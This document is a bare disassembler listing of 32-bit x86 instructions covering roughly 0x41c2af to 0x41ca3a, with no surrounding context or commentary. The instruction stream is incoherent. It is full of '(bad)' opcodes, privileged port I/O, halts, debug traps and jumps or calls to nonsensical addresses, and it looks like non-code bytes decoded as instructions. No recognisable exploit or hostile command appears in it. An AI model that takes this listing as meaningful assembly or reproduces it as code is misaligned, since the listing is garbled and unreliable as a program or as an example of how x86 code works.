  41c2af:	mov    bh,BYTE PTR [ecx+0x10c40bce]
  41c2b5:	sti    
  41c2b6:	and    esp,esi
  41c2b8:	xchg   esi,eax
  41c2b9:	cmp    al,BYTE PTR [edx+eax*1]
  41c2bc:	dec    esp
  41c2bd:	adc    DWORD PTR [edx+0x2a61e895],ebp
  41c2c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2c4:	int    0x18
  41c2c6:	lahf   
  41c2c7:	xchg   ecx,eax
  41c2c8:	setns  BYTE PTR [edi-0x2e]
  41c2cc:	or     DWORD PTR [esi+0x62],0x1e
  41c2d0:	test   bl,bh
  41c2d2:	in     al,0x5f
  41c2d4:	xor    BYTE PTR [ebx],ah
  41c2d6:	xlat   BYTE PTR ds:[ebx]
  41c2d7:	mov    dh,0x6
  41c2d9:	call   0x8bf7283
  41c2de:	cmp    ah,BYTE PTR [ecx]
  41c2e0:	mov    DWORD PTR es:[edi],esi
  41c2e3:	cmp    eax,0x841988de
  41c2e8:	fst    QWORD PTR [edx+0x58383e57]
  41c2ee:	shl    BYTE PTR [edi],cl
  41c2f0:	sub    DWORD PTR [ecx+0x1a1d769e],esp
  41c2f6:	push   0x73efb05c
  41c2fb:	xchg   ebp,eax
  41c2fc:	out    0x1,al
  41c2fe:	clc    
  41c2ff:	loopne 0x41c363
  41c301:	dec    esi
  41c302:	std    
  41c303:	add    BYTE PTR [edi-0x29],0x7f
  41c307:	les    esi,FWORD PTR [ebx]
  41c309:	test   DWORD PTR [edi-0x7ab90fb0],0x42e4fc83
  41c313:	inc    ecx
  41c314:	test   BYTE PTR ds:0xb48db83,ch
  41c31a:	mov    DWORD PTR [eax+0x7b],0x2797a79c
  41c321:	nop
  41c322:	pop    ebp
  41c323:	hlt    
  41c324:	mov    DWORD PTR [esi+ebx*8+0x42],0xd4592b72
  41c32c:	jg     0x41c336
  41c32e:	push   ss
  41c32f:	(bad)  
  41c330:	test   DWORD PTR [edx],0x10067359
  41c336:	shr    BYTE PTR [ecx-0x6f058bf9],cl
  41c33c:	mov    ch,0xc6
  41c33e:	inc    esi
  41c33f:	ja     0x41c394
  41c341:	hlt    
  41c342:	inc    edx
  41c343:	sbb    dl,BYTE PTR [edx-0x3a]
  41c346:	xor    ah,bh
  41c348:	test   al,0x6e
  41c34a:	arpl   WORD PTR [esi+0x5fa61ba0],dx
  41c350:	push   edx
  41c351:	adc    eax,0x553808cf
  41c356:	dec    esi
  41c357:	repz pop eax
  41c359:	mov    ch,0xdf
  41c35b:	jg     0x41c314
  41c35d:	mov    bl,0xe3
  41c35f:	repnz and BYTE PTR [ecx-0x19],dl
  41c363:	(bad)  
  41c365:	adc    al,0x85
  41c367:	push   0xae9865ff
  41c36c:	jge    0x41c329
  41c36e:	mov    ds,WORD PTR [ebp-0x16]
  41c371:	inc    ecx
  41c372:	mov    esp,ebp
  41c374:	fistp  WORD PTR [ebx+0x262f7d47]
  41c37a:	ins    DWORD PTR es:[edi],dx
  41c37b:	push   cs
  41c37c:	xchg   ebx,eax
  41c37d:	add    ch,dh
  41c37f:	fwait
  41c380:	in     eax,dx
  41c381:	xor    eax,0xc2a5927b
  41c386:	pop    es
  41c387:	sbb    esp,esp
  41c389:	pusha  
  41c38a:	ret    
  41c38b:	sub    bh,al
  41c38d:	sub    dh,BYTE PTR [ebp-0x7ddde331]
  41c393:	lods   al,BYTE PTR ds:[esi]
  41c394:	(bad)  [ecx-0x27]
  41c397:	mov    bh,0x8c
  41c399:	sub    ah,BYTE PTR [esi+edi*8+0x6d2dfc99]
  41c3a0:	sbb    al,0x6b
  41c3a2:	pusha  
  41c3a3:	xor    edi,DWORD PTR [ebp-0x7a]
  41c3a6:	adc    BYTE PTR [ebp-0x72],dl
  41c3a9:	or     dl,BYTE PTR [edx-0x76]
  41c3ac:	out    dx,al
  41c3ad:	(bad)  
  41c3ae:	iret   
  41c3af:	fwait
  41c3b0:	jns    0x41c3cd
  41c3b2:	out    0x88,eax
  41c3b4:	stos   BYTE PTR es:[edi],al
  41c3b5:	and    al,BYTE PTR [ebp+0x6b]
  41c3b8:	mov    ebp,cs
  41c3ba:	mov    ecx,0x7a56a1ae
  41c3bf:	mov    esi,0x46bfe307
  41c3c4:	push   0x72b0cbca
  41c3c9:	push   0xffffff9c
  41c3cb:	mov    bh,0x63
  41c3cd:	mov    ebp,0xc18fbde
  41c3d2:	push   0xb96f7c89
  41c3d7:	ret    0xb033
  41c3da:	push   ebp
  41c3db:	ror    ah,1
  41c3dd:	inc    edx
  41c3de:	scas   eax,DWORD PTR es:[edi]
  41c3df:	xchg   esi,eax
  41c3e0:	push   esp
  41c3e1:	dec    ebx
  41c3e2:	sti    
  41c3e3:	sub    ebx,DWORD PTR ds:0x5c47be68
  41c3e9:	pop    ds
  41c3ea:	scas   al,BYTE PTR es:[edi]
  41c3eb:	pop    ds
  41c3ec:	sub    edi,DWORD PTR [eax+0x4311c664]
  41c3f2:	loope  0x41c461
  41c3f4:	bound  esp,QWORD PTR [esi+0x1ea30674]
  41c3fa:	pop    ds
  41c3fb:	add    BYTE PTR [bp+di-0x5d1f],ah
  41c400:	dec    edi
  41c401:	pop    eax
  41c402:	sbb    eax,0xe1603cf1
  41c407:	xchg   bl,ah
  41c409:	(bad)  
  41c40b:	xlat   BYTE PTR ds:[ebx]
  41c40c:	jns    0x41c460
  41c40e:	repz (bad) 
  41c410:	sti    
  41c411:	bound  edx,QWORD PTR [eax]
  41c413:	lahf   
  41c414:	inc    edx
  41c415:	cdq    
  41c416:	mov    ah,BYTE PTR ds:0x50f45e05
  41c41c:	jmp    0x41c3f9
  41c41e:	push   0x850d2ea
  41c423:	sbb    eax,0xffffff86
  41c426:	or     eax,0xde108746
  41c42b:	sbb    esi,DWORD PTR [ecx-0x2a]
  41c42e:	addr16 sahf 
  41c430:	xchg   ebx,eax
  41c431:	jecxz  0x41c49c
  41c433:	xchg   BYTE PTR [eax],dl
  41c435:	jbe    0x41c3f8
  41c437:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c438:	cdq    
  41c439:	add    bh,BYTE PTR [edi-0x4b]
  41c43c:	out    dx,al
  41c43d:	xchg   ebx,eax
  41c43e:	sbb    BYTE PTR [ebp-0x1e],dh
  41c441:	arpl   WORD PTR [edx],si
  41c443:	les    ebp,FWORD PTR [edi-0x6b]
  41c446:	jp     0x41c422
  41c448:	inc    eax
  41c449:	inc    edi
  41c44a:	daa    
  41c44b:	push   esi
  41c44c:	imul   edx,DWORD PTR [eax+0x603065a2],0xffffffd5
  41c453:	sbb    DWORD PTR [edx+ebx*8-0xaa49d20],0xbce4459c
  41c45e:	mov    ah,0x55
  41c460:	fistp  QWORD PTR [edx+0x39]
  41c463:	icebp  
  41c464:	into   
  41c465:	xor    al,0x5c
  41c467:	adc    ebp,ebx
  41c469:	adc    eax,0xc720a7e7
  41c46e:	icebp  
  41c46f:	mov    al,ds:0xdcf6f6e2
  41c474:	inc    esi
  41c475:	mov    bl,BYTE PTR [esi]
  41c477:	sbb    eax,0xb81eb21
  41c47c:	dec    esp
  41c47d:	push   0x5c8e44b5
  41c482:	in     eax,dx
  41c483:	imul   ebp,DWORD PTR [ebp-0x2a],0x68
  41c487:	data16 (bad) 
  41c489:	jnp    0x41c4f1
  41c48b:	mov    eax,ds:0xc1ccd42a
  41c490:	nop
  41c491:	aam    0x71
  41c493:	sti    
  41c494:	sub    DWORD PTR [eax],edx
  41c496:	mov    ebp,0x2347514f
  41c49b:	hlt    
  41c49c:	add    dl,ah
  41c49e:	icebp  
  41c49f:	repz mov ch,0x60
  41c4a2:	nop
  41c4a3:	sub    esp,edi
  41c4a5:	fwait
  41c4a6:	mov    ch,0x9d
  41c4a8:	or     BYTE PTR [edx+0xc],bl
  41c4ab:	push   es
  41c4ac:	mov    ecx,0xb4e2347b
  41c4b1:	ret    
  41c4b2:	mov    edx,0xb25c48dd
  41c4b7:	jae    0x41c47f
  41c4b9:	jnp    0x41c46a
  41c4bb:	inc    esi
  41c4bc:	sub    al,0x97
  41c4be:	fsubr  QWORD PTR [edx+eiz*2]
  41c4c1:	jo     0x41c482
  41c4c3:	scas   al,BYTE PTR es:[edi]
  41c4c4:	jge    0x41c508
  41c4c6:	stos   DWORD PTR es:[edi],eax
  41c4c7:	inc    esi
  41c4c8:	add    al,0x26
  41c4ca:	mov    bl,0xf4
  41c4cc:	call   0x18d3:0xf5ea8640
  41c4d3:	pop    eax
  41c4d4:	test   bl,0xcb
  41c4d7:	and    edi,DWORD PTR [edx+0x52]
  41c4da:	(bad)  
  41c4db:	sub    edx,DWORD PTR [ebx-0x10]
  41c4de:	repnz or al,0x32
  41c4e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4e2:	rcr    BYTE PTR [edi],1
  41c4e4:	stc    
  41c4e5:	aas    
  41c4e6:	hlt    
  41c4e7:	scas   al,BYTE PTR es:[edi]
  41c4e8:	std    
  41c4e9:	push   ebp
  41c4ea:	mov    ebx,0xab5de38e
  41c4ef:	push   cs
  41c4f0:	add    ebp,DWORD PTR [edx-0x7e2d63c9]
  41c4f6:	add    edi,ecx
  41c4f8:	sub    al,0xd6
  41c4fa:	lock sbb DWORD PTR [ebx-0x5c00bf3],ebp
  41c501:	je     0x41c53a
  41c503:	ds call 0xbd25c58d
  41c509:	and    DWORD PTR [ebp-0xf],esp
  41c50c:	xor    eax,0xe3d2e5e3
  41c511:	cmp    al,0xe8
  41c513:	sbb    al,BYTE PTR [edx-0x5e]
  41c516:	or     ah,dl
  41c518:	fs cs push ecx
  41c51b:	cmp    ch,BYTE PTR [esi-0x51]
  41c51e:	and    edx,DWORD PTR ds:0xba1be089
  41c524:	adc    DWORD PTR [edx-0x7896ac48],esi
  41c52a:	fst    DWORD PTR [edx]
  41c52c:	retf   0x951
  41c52f:	fcmovne st,st(1)
  41c531:	out    0x28,al
  41c533:	inc    ebp
  41c534:	adc    ebx,DWORD PTR [ecx-0x26]
  41c537:	shl    DWORD PTR [ecx-0x59],0x2a
  41c53b:	mov    al,ds:0xe36022da
  41c540:	mov    esi,0xd49d35f1
  41c545:	fstp   QWORD PTR [esi-0x49]
  41c548:	ret    0x7185
  41c54b:	ret    
  41c54c:	dec    edi
  41c54d:	ror    DWORD PTR [ecx-0x2cc276ac],0x3f
  41c554:	(bad)
  41c558:	sar    DWORD PTR [edx-0x50],0xac
  41c55c:	loop   0x41c581
  41c55e:	fisttp WORD PTR [ecx+0x56]
  41c561:	mov    ebx,0x5fd55646
  41c566:	jns    0x41c5e6
  41c568:	es cmp al,0x4e
  41c56b:	lods   al,BYTE PTR fs:[esi]
  41c56d:	cmp    eax,0xa9311943
  41c572:	sbb    edx,DWORD PTR fs:[eax]
  41c575:	pop    ds
  41c576:	test   dh,0x7d
  41c579:	jmp    0x41c510
  41c57b:	cdq    
  41c57c:	ret    
  41c57d:	or     BYTE PTR [edi],bh
  41c57f:	out    dx,al
  41c580:	(bad)  
  41c581:	(bad)  
  41c582:	jno    0x41c57a
  41c584:	xchg   edi,eax
  41c585:	shr    eax,0xec
  41c588:	xlat   BYTE PTR ds:[ebx]
  41c589:	add    DWORD PTR [edi],ecx
  41c58b:	sti    
  41c58c:	and    eax,0xd6d33820
  41c591:	mov    ch,0x4c
  41c593:	and    esp,edx
  41c595:	mov    dh,0x1b
  41c597:	imul   esp,DWORD PTR [edx-0x40],0xb6130d
  41c59e:	fdivr  DWORD PTR [edx-0x3db27b10]
  41c5a4:	mov    al,0x22
  41c5a6:	sub    BYTE PTR [edi-0x6614a754],bl
  41c5ac:	xor    al,0xb0
  41c5ae:	mov    WORD PTR [eax+0x79],gs
  41c5b1:	mov    edx,0xe6dd7c8d
  41c5b6:	xor    al,0x88
  41c5b8:	mov    ebp,0x224315a5
  41c5bd:	ins    BYTE PTR es:[di],dx
  41c5bf:	rol    DWORD PTR [eax-0x4a],cl
  41c5c2:	dec    esp
  41c5c3:	cdq    
  41c5c4:	sbb    DWORD PTR [ecx+0x2e],edi
  41c5c7:	int    0xb7
  41c5c9:	loop   0x41c57e
  41c5cb:	jnp    0x41c5ff
  41c5cd:	mov    ebx,0xd51e23d3
  41c5d2:	dec    ebx
  41c5d3:	retf   
  41c5d4:	sub    eax,0x6653f805
  41c5d9:	mov    ecx,esi
  41c5db:	fisub  DWORD PTR [edi-0x40cb63d5]
  41c5e1:	repnz mov al,0xad
  41c5e4:	sbb    edi,DWORD PTR [esi+0x66]
  41c5e7:	xor    al,0x67
  41c5e9:	test   BYTE PTR [ecx+0xc],0xe0
  41c5ed:	sar    DWORD PTR [esi+esi*4],0xc0
  41c5f1:	sti    
  41c5f2:	shr    BYTE PTR [edx],1
  41c5f4:	mov    DWORD PTR [ebp-0x3dcaf2c3],0xbecb794b
  41c5fe:	cmp    ebp,DWORD PTR [ecx+0x4f]
  41c601:	adc    al,0xd2
  41c603:	mov    dl,0x76
  41c605:	inc    esi
  41c606:	aam    0x30
  41c608:	fild   WORD PTR [ebp+0x51fc203d]
  41c60e:	pop    ebp
  41c60f:	rsqrtps xmm3,XMMWORD PTR [ebx+0x71]
  41c613:	out    dx,eax
  41c614:	fbld   TBYTE PTR [esi+0x26e49085]
  41c61a:	xchg   edx,eax
  41c61b:	sub    eax,0xf3de490
  41c620:	sahf   
  41c621:	and    DWORD PTR [ecx],eax
  41c623:	and    eax,0x135e8a26
  41c628:	call   0x6b8330c
  41c62d:	popf   
  41c62e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c62f:	and    cl,BYTE PTR [edi+0x5a605968]
  41c635:	inc    ebp
  41c636:	faddp  st(0),st
  41c638:	jbe    0x41c5f1
  41c63a:	mov    ebx,0x19ba907c
  41c63f:	mov    dh,0x97
  41c641:	mov    edi,0x8754aa0c
  41c646:	adc    DWORD PTR [edx+0x12280546],ebx
  41c64c:	add    eax,0x5ae8cc3
  41c651:	cmp    edi,DWORD PTR [ebp+0x19]
  41c654:	outs   dx,DWORD PTR ds:[esi]
  41c655:	sub    ebx,DWORD PTR [eax-0x66]
  41c658:	test   BYTE PTR ds:0x8c54237b,0x17
  41c65f:	out    dx,eax
  41c660:	icebp  
  41c661:	nop
  41c662:	lods   eax,DWORD PTR ds:[esi]
  41c663:	mov    eax,0x10b3ce86
  41c668:	test   BYTE PTR [ebx+0x27],bl
  41c66b:	sbb    esi,esp
  41c66d:	repnz xor al,0x67
  41c670:	test   dl,cl
  41c672:	push   edi
  41c673:	or     ebp,edi
  41c675:	retf   0x8399
  41c678:	lahf   
  41c679:	sar    DWORD PTR [edx-0x77],cl
  41c67c:	mov    bl,0x7e
  41c67e:	jne    0x41c636
  41c680:	adc    BYTE PTR [ecx],bh
  41c682:	xor    eax,0xf386be6e
  41c687:	adc    edi,DWORD PTR [ebp+eiz*1-0x36]
  41c68b:	push   ss
  41c68c:	mov    cl,0x77
  41c68e:	test   eax,0xf07c0c18
  41c693:	dec    esi
  41c694:	sub    BYTE PTR [ecx-0xc1d14a6],0x2a
  41c69b:	inc    edx
  41c69c:	cmp    dh,BYTE PTR [ecx+0x4e1601f2]
  41c6a2:	xor    DWORD PTR [ecx],ecx
  41c6a4:	mov    ebp,0x6008d346
  41c6a9:	xchg   BYTE PTR [edx-0x3f67f9ec],cl
  41c6af:	pop    dx
  41c6b1:	in     eax,dx
  41c6b2:	fistp  WORD PTR [ecx+0x58]
  41c6b5:	ret    0x9a7e
  41c6b8:	stos   BYTE PTR es:[edi],al
  41c6b9:	mov    esi,0xa92b1ba8
  41c6be:	rcr    DWORD PTR [ecx+0x14],0xf5
  41c6c2:	and    BYTE PTR [ebp+0x65],dh
  41c6c5:	(bad)  
  41c6c6:	popa   
  41c6c7:	(bad)  
  41c6c8:	lock and ch,BYTE PTR gs:[edx]
  41c6cc:	stc    
  41c6cd:	add    eax,0xb21e6c76
  41c6d2:	jo     0x41c6ea
  41c6d4:	sbb    al,0xef
  41c6d6:	jmp    0xae908190
  41c6db:	xlat   BYTE PTR ds:[ebx]
  41c6dc:	cmp    BYTE PTR [eax+0x2d],dh
  41c6df:	jbe    0x41c724
  41c6e1:	pop    es
  41c6e2:	and    dl,dl
  41c6e4:	aaa    
  41c6e5:	xor    ah,BYTE PTR [eax]
  41c6e7:	xchg   edi,eax
  41c6e8:	sub    DWORD PTR [edx],edx
  41c6ea:	sbb    ebx,DWORD PTR [esi]
  41c6ec:	sub    ch,BYTE PTR [edx+ebx*8+0x62ba3463]
  41c6f3:	mov    dh,0x32
  41c6f5:	xor    al,0xf5
  41c6f7:	cmp    al,0x59
  41c6f9:	pop    ebx
  41c6fa:	es pop esp
  41c6fc:	fisub  WORD PTR [edx+0x5e3208a7]
  41c702:	push   ss
  41c703:	fsub   QWORD PTR [eax+0x9]
  41c706:	pop    edx
  41c707:	stc    
  41c708:	add    eax,0xf6aea81f
  41c70d:	(bad)  
  41c70e:	fwait
  41c70f:	pop    edi
  41c710:	xor    DWORD PTR [edx+0x7b],edx
  41c713:	in     al,0x73
  41c715:	out    dx,al
  41c716:	ror    dh,1
  41c718:	sub    ebx,ebx
  41c71a:	mov    edi,0xc7f932d6
  41c71f:	retf   0xcc66
  41c722:	rcr    DWORD PTR [esi+0x60364a8d],cl
  41c728:	push   eax
  41c729:	add    bl,dl
  41c72b:	jp     0x41c790
  41c72d:	ds inc ecx
  41c72f:	aaa    
  41c730:	push   eax
  41c731:	in     eax,0x55
  41c733:	lock (bad) 
  41c735:	xlat   BYTE PTR ds:[ebx]
  41c736:	in     eax,0x37
  41c738:	pop    esi
  41c739:	mov    bl,0x2e
  41c73b:	enter  0xb59d,0xe1
  41c73f:	jp     0x41c71c
  41c741:	fwait
  41c742:	mov    DWORD PTR [edx+0x26],ecx
  41c745:	mov    ah,0x9e
  41c747:	dec    esp
  41c748:	adc    al,0xdb
  41c74a:	fld    TBYTE PTR [ecx+0x4fd56807]
  41c750:	dec    ecx
  41c751:	ins    DWORD PTR es:[edi],dx
  41c752:	push   eax
  41c753:	mov    bh,0xe8
  41c755:	pop    ss
  41c756:	fdiv   st,st(7)
  41c758:	gs in  eax,dx
  41c75a:	pop    ebp
  41c75c:	add    edx,ebp
  41c75e:	adc    al,0x8b
  41c760:	enter  0xa3f7,0xc6
  41c764:	call   0x27812742
  41c769:	fdiv   DWORD PTR [ebx+0x76bd5271]
  41c76f:	lods   al,BYTE PTR ds:[esi]
  41c770:	(bad)  
  41c771:	daa    
  41c772:	shl    BYTE PTR [ecx+0x25],1
  41c775:	xchg   ebx,eax
  41c776:	add    eax,DWORD PTR [edi-0x52]
  41c779:	bound  edi,QWORD PTR [edi+eiz*8-0x61]
  41c77d:	jg     0x41c721
  41c77f:	push   edx
  41c780:	popf   
  41c781:	sar    DWORD PTR [edx+0x23],cl
  41c784:	ins    DWORD PTR es:[edi],dx
  41c785:	call   0xa3439d0f
  41c78a:	adc    bh,dh
  41c78c:	call   FWORD PTR [esi]
  41c78e:	or     al,BYTE PTR [esi-0x2d]
  41c791:	dec    edx
  41c792:	div    DWORD PTR [esi]
  41c794:	jl     0x41c739
  41c796:	and    DWORD PTR [edx],esp
  41c798:	ds pop ebp
  41c79a:	sbb    DWORD PTR [esi+0x15],esp
  41c79d:	ret    
  41c79e:	loop   0x41c7d9
  41c7a0:	addr16 in al,0xa1
  41c7a3:	or     eax,0xd74bd67b
  41c7a8:	xor    eax,0x717865d7
  41c7ad:	push   ebp
  41c7ae:	fsub   DWORD PTR [ebx+0x27]
  41c7b1:	ret    0x50b
  41c7b4:	pop    ebx
  41c7b5:	push   es
  41c7b6:	pusha  
  41c7b7:	clc    
  41c7b8:	jmp    0xb54c:0xb772c9be
  41c7bf:	xlat   BYTE PTR ds:[ebx]
  41c7c0:	loop   0x41c811
  41c7c2:	test   DWORD PTR [edx-0x66c66b6b],esp
  41c7c8:	dec    ebx
  41c7c9:	add    esp,DWORD PTR [ebx-0x16]
  41c7cc:	mov    bl,ah
  41c7ce:	fistp  WORD PTR [edx+0x19]
  41c7d1:	add    DWORD PTR [edi],eax
  41c7d3:	jno    0x41c803
  41c7d5:	test   DWORD PTR ds:0x51b0f666,esp
  41c7db:	stos   DWORD PTR es:[edi],eax
  41c7dc:	inc    esi
  41c7dd:	inc    edx
  41c7de:	dec    edi
  41c7df:	(bad)  
  41c7e0:	push   esp
  41c7e1:	in     eax,0x5f
  41c7e3:	cmp    al,BYTE PTR [ebp+0x7e]
  41c7e6:	cdq    
  41c7e7:	cmp    edx,ebp
  41c7e9:	cmp    ebp,0xffffff8b
  41c7ec:	repnz sbb DWORD PTR [ecx],0x2e7029ce
  41c7f3:	popf   
  41c7f4:	pop    ds
  41c7f5:	mov    ch,BYTE PTR [edx+edi*1+0x9d89bf4]
  41c7fc:	sub    al,0x8e
  41c7fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7ff:	jge    0x41c7b0
  41c801:	mov    DWORD PTR ds:0x19d06ef7,ebx
  41c807:	cld    
  41c808:	and    eax,0xf7751e6b
  41c80d:	test   eax,0x17beeb92
  41c812:	or     edi,DWORD PTR [edx]
  41c814:	es push ds
  41c816:	fdivr  QWORD PTR [edi-0x4601887d]
  41c81c:	dec    esi
  41c81d:	scas   eax,DWORD PTR es:[edi]
  41c81e:	xchg   edx,eax
  41c81f:	dec    esi
  41c820:	ret    
  41c821:	aaa    
  41c822:	xchg   esi,eax
  41c823:	fwait
  41c824:	mov    ecx,DWORD PTR [ebx+0x35946375]
  41c82a:	mov    ds:0xdca72cb1,al
  41c82f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c830:	aas    
  41c831:	sahf   
  41c832:	test   ebp,ebp
  41c834:	lods   eax,DWORD PTR ds:[esi]
  41c835:	mov    al,0x1c
  41c837:	cdq    
  41c838:	(bad)  
  41c839:	push   cs
  41c83a:	jnp    0x41c89b
  41c83c:	adc    ebx,esp
  41c83e:	dec    edx
  41c83f:	out    0x7f,al
  41c841:	fadd   st,st(6)
  41c843:	jno    0x41c7c6
  41c845:	ja     0x41c7f4
  41c847:	daa    
  41c848:	adc    ebx,esp
  41c84a:	fcmovb st,st(4)
  41c84c:	dec    eax
  41c84d:	mov    eax,0xa763c714
  41c852:	icebp  
  41c853:	jo     0x41c82b
  41c855:	ror    DWORD PTR [ebx],0xe5
  41c858:	xor    esp,DWORD PTR [ebx-0x18]
  41c85b:	xchg   ebp,eax
  41c85c:	outs   dx,DWORD PTR ds:[esi]
  41c85d:	std    
  41c85e:	mov    dl,0xbb
  41c860:	add    al,ah
  41c862:	js     0x41c8d6
  41c864:	cwde   
  41c865:	in     eax,dx
  41c866:	jecxz  0x41c8ab
  41c868:	and    al,0xcb
  41c86a:	rcr    BYTE PTR [edi],cl
  41c86c:	mov    DWORD PTR [ebp-0x66],0xc240dca4
  41c873:	and    ebx,eax
  41c875:	inc    ebp
  41c876:	sbb    eax,0x17a253cf
  41c87b:	call   0xeb9e:0x4e5c807d
  41c882:	mov    ah,0xab
  41c884:	and    DWORD PTR [ebp-0x55],ecx
  41c887:	push   eax
  41c888:	nop
  41c889:	nop
  41c88a:	lds    esi,FWORD PTR [edi+0x7d74b209]
  41c890:	popa   
  41c891:	repnz dec ecx
  41c893:	hlt    
  41c894:	fldcw  WORD PTR [edi+esi*1]
  41c897:	in     al,0xc2
  41c899:	inc    ecx
  41c89a:	out    0x64,al
  41c89c:	test   eax,0xc72e4daf
  41c8a1:	jle    0x41c901
  41c8a3:	std    
  41c8a4:	(bad)  
  41c8a6:	inc    edi
  41c8a7:	push   ss
  41c8a8:	cmp    BYTE PTR [edx+ecx*2+0x2d6ec8bc],bl
  41c8af:	push   esi
  41c8b0:	pop    eax
  41c8b1:	int    0xb8
  41c8b3:	cmp    BYTE PTR [esi+edi*4+0x4f918694],bl
  41c8ba:	inc    ecx
  41c8bb:	adc    cl,dl
  41c8bd:	js     0x41c8c7
  41c8bf:	sub    eax,0x893124ff
  41c8c4:	loope  0x41c92f
  41c8c6:	sbb    al,0xed
  41c8c8:	or     BYTE PTR [edi-0x4b138f82],al
  41c8ce:	push   ecx
  41c8cf:	push   ebx
  41c8d0:	les    edx,FWORD PTR ds:0x93c51e92
  41c8d6:	aad    0xea
  41c8d8:	push   ebp
  41c8d9:	outs   dx,DWORD PTR ds:[esi]
  41c8da:	mov    ds:0x8c60e81e,eax
  41c8df:	fs xchg ecx,eax
  41c8e1:	push   edx
  41c8e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8e3:	repnz and BYTE PTR [edx-0x77528624],dh
  41c8ea:	ret    0x87d8
  41c8ed:	mov    fs,WORD PTR [eax-0x68]
  41c8f0:	jae    0x41c881
  41c8f2:	adc    BYTE PTR [ebp-0x63],bl
  41c8f5:	cs pop ebx
  41c8f7:	aaa    
  41c8f8:	lahf   
  41c8f9:	mov    esi,0x883f10b3
  41c8fe:	cmp    bl,BYTE PTR [ebp-0x6c4ed9a6]
  41c904:	xchg   ecx,eax
  41c905:	and    DWORD PTR [esi-0x113a494b],edi
  41c90b:	dec    ebp
  41c90c:	jnp    0x41c96a
  41c90e:	ficomp DWORD PTR [ebp-0xa]
  41c911:	fadd   st(2),st
  41c913:	cwde   
  41c914:	shl    DWORD PTR ds:0xdb7e451b,0x5a
  41c91b:	je     0x41c8a6
  41c91d:	das    
  41c91e:	xchg   edi,eax
  41c91f:	cmp    DWORD PTR [edi+0x6ca524e],0x75ce5dc9
  41c929:	dec    ebp
  41c92a:	arpl   sp,dx
  41c92c:	mov    ds:0xfe06f7ee,eax
  41c931:	sahf   
  41c932:	daa    
  41c933:	push   ebp
  41c934:	sti    
  41c935:	mov    bh,0xa6
  41c937:	adc    edx,DWORD PTR fs:[eax+0x531778d8]
  41c93e:	xor    al,0x76
  41c940:	mov    ch,0x32
  41c942:	scas   eax,DWORD PTR es:[edi]
  41c943:	shl    edx,0x40
  41c946:	jb     0x41c8ca
  41c948:	sub    ebp,DWORD PTR [ebp+0x25]
  41c94b:	adc    DWORD PTR [ebx],edi
  41c94d:	xchg   edi,eax
  41c94e:	fmul   QWORD PTR [edx+ecx*8-0x79c898a]
  41c955:	cmp    DWORD PTR [edi+0x2d586976],ebx
  41c95b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c95c:	push   ss
  41c95d:	stos   BYTE PTR es:[edi],al
  41c95e:	fadd   DWORD PTR [edi-0x2a]
  41c961:	loopne 0x41c995
  41c963:	std    
  41c964:	adc    edi,esp
  41c966:	push   cs
  41c967:	mov    ecx,0x8c6fa984
  41c96c:	pop    ecx
  41c96d:	test   DWORD PTR [eax-0x1a],ebx
  41c970:	popa   
  41c971:	mov    ch,0x3e
  41c973:	dec    ebp
  41c974:	mov    cl,0xca
  41c976:	in     al,0xc0
  41c978:	fld    DWORD PTR [esi-0x6d]
  41c97b:	sub    ebp,eax
  41c97d:	fcmove st,st(4)
  41c97f:	das    
  41c980:	sbb    ch,BYTE PTR [edi+0x5a]
  41c983:	push   edx
  41c984:	and    eax,DWORD PTR [edx+0x5]
  41c987:	test   al,0xae
  41c989:	adc    eax,0xa908da62
  41c98e:	push   esp
  41c98f:	jno    0x41c95c
  41c991:	js     0x41c91f
  41c993:	push   edx
  41c994:	js     0x41ca03
  41c996:	inc    edx
  41c997:	pop    esp
  41c998:	stos   DWORD PTR es:[edi],eax
  41c999:	jne    0x41c97f
  41c99b:	dec    ebx
  41c99c:	into   
  41c99d:	xchg   ebx,eax
  41c99e:	cldemote BYTE PTR [esi+0x1d]
  41c9a2:	dec    esp
  41c9a3:	or     al,0xd7
  41c9a5:	retf   
  41c9a6:	mov    ah,0xdb
  41c9a8:	xor    edi,ecx
  41c9aa:	xchg   ebp,eax
  41c9ab:	jmp    0xa97f1b7c
  41c9b0:	test   DWORD PTR [eax+0x7],ecx
  41c9b3:	lahf   
  41c9b4:	cli    
  41c9b5:	sti    
  41c9b6:	out    0x7f,al
  41c9b8:	jnp    0x41c994
  41c9ba:	aaa    
  41c9bb:	es ror ecx,0x5e
  41c9bf:	sbb    al,0xfc
  41c9c1:	cdq    
  41c9c2:	jne    0x41c982
  41c9c4:	call   0x886fdbe3
  41c9c9:	xor    ch,BYTE PTR ds:0xceecbc39
  41c9cf:	clc    
  41c9d0:	and    al,0x66
  41c9d3:	inc    ebx
  41c9d4:	sub    al,0x81
  41c9d6:	imul   ecx,eax,0xffffff98
  41c9d9:	adc    bl,dh
  41c9db:	shr    ch,1
  41c9dd:	cs popw ds
  41c9e0:	js     0x41c9e7
  41c9e2:	test   BYTE PTR [edi+ebx*2+0xdcfd307],ch
  41c9e9:	out    0xd5,al
  41c9eb:	inc    edi
  41c9ec:	mov    edi,0x24477320
  41c9f1:	mov    al,0x4
  41c9f3:	lock add DWORD PTR [ecx+0x3b],edi
  41c9f7:	pop    ds
  41c9f8:	cmp    eax,0x30c7732c
  41c9fd:	jge    0x41c9c7
  41c9ff:	ins    BYTE PTR es:[edi],dx
  41ca00:	mov    edx,0xd0b95618
  41ca05:	mov    cl,0x6d
  41ca07:	out    0x3b,al
  41ca09:	mov    ebx,0x39911a9
  41ca0e:	xchg   ecx,eax
  41ca0f:	mov    esi,0x67bb6861
  41ca14:	or     DWORD PTR [ecx-0x628d4cb8],edi
  41ca1a:	sahf   
  41ca1b:	cli    
  41ca1c:	mov    ds:0xd641f087,eax
  41ca21:	ss dec esi
  41ca23:	out    dx,al
  41ca24:	fist   WORD PTR [ecx]
  41ca26:	rol    ecx,cl
  41ca28:	jmp    0xe488:0xb2d02164
  41ca2f:	lods   al,BYTE PTR ds:[esi]
  41ca30:	popf   
  41ca31:	call   0x43f3:0xfe9e9817
  41ca38:	mov    dh,0xac
  41ca3a:	mov    bl,0x79
